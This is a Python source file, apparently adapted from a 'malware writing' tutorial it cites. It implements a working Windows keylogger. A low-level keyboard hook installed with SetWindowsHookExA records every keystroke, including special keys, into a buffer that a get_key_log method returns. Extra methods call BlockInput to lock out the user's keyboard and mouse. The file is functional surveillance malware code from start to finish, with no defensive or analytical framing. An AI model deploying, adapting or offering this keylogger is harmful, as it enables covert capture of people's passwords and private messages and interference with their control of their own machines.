"""
Reference: https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858
"""

from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
from ctypes import wintypes
import os


user32 = windll.user32
kernel32 = windll.kernel32

kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
user32.SetWindowsHookExA.argtypes = (
    c_int,
    wintypes.HANDLE,
    wintypes.HMODULE,
    wintypes.DWORD,
)

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
HC_ACTION = 0

VIRTUAL_KEYS = {
    os.linesep: 0x0D,
    "[LCONTROL]": 0xA2,
    "[RCONTROL]": 0xA3,
    "[LSHIFT]": 0xA0,
    "[RSHIFT]": 0xA1,
    "[TAB]": 0x09,
    "[BACKSPACE]": 0x08,
    "[CAPSLOCK]": 0x14,
    "[ESCAPE]": 0x1B,
    "[HOME]": 0x24,
    "[INS]": 0x2D,
    "[DEL]": 0x2E,
    "[END]": 0x23,
    "[PRINTSCREEN]": 0x2C,
    "[PGUP]": 0x21,
    "[PGDN]": 0x22,
    "[UP]": 0x26,
    "[DOWN]": 0x28,
    "[LEFT]": 0x25,
    "[RIGHT]": 0x27,
    "[F1]": 0x70,
    "[F2]": 0x71,
    "[F3]": 0x72,
    "[F4]": 0x73,
    "[F5]": 0x74,
    "[F6]": 0x75,
    "[F7]": 0x76,
    "[F8]": 0x77,
    "[F9]": 0x78,
    "[F10]": 0x79,
    "[F11]": 0x7A,
    "[F12]": 0x7B,
}


HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)  # Callback function


class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", DWORD),
        ("scanCode", DWORD),
        ("flags", DWORD),
        ("time", DWORD),
        ("dwExtraInfo", DWORD),
    ]


class Hooker:
    def __init__(self):
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None
        self.is_blocked = False
        self.line = bytearray()
        self.ptr = HOOKPROC(self.hook_procedure)

    def install_hook(self):
        if self.is_hooked:
            return True

        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL, self.ptr, kernel32.GetModuleHandleW(None), 0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None

    def hook_procedure(self, nCode, wParam, lParam):
        if nCode == HC_ACTION and wParam == WM_KEYDOWN:

            kb = KBDLLHOOKSTRUCT.from_address(lParam)
            user32.GetKeyState(VIRTUAL_KEYS["[LSHIFT]"])
            user32.GetKeyState(VIRTUAL_KEYS["[RSHIFT]"])
            state = (c_char * 256)()
            user32.GetKeyboardState(byref(state))
            buff = create_unicode_buffer(8)
            n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
            key = wstring_at(buff)  # Key pressed as buffer

            if n >= 0 and not self.is_blocked:
                if kb.vkCode not in VIRTUAL_KEYS.values():
                    self.line.extend(bytes(key, "utf8"))

                else:
                    for key, value in VIRTUAL_KEYS.items():
                        if kb.vkCode == value:
                            self.line.extend(bytes(key, "utf8"))

        return user32.CallNextHookEx(self.is_hooked, nCode, wParam, lParam)

    def start(self):
        if self.install_hook():
            print("Start hook")
            msg = MSG()
            user32.GetMessageA(byref(msg), 0, 0, 0)

    def stop(self):
        self.uninstall_hook()
        print("Stop hook")

    def block(self):
        self.is_blocked = user32.BlockInput(True)
        return self.is_blocked

    def unblock(self):
        if self.is_blocked:
            self.is_blocked = not user32.BlockInput(False)
        return not self.is_blocked

    def get_key_log(self):
        temp = str(self.line, "utf8")
        self.line = bytearray()
        return temp
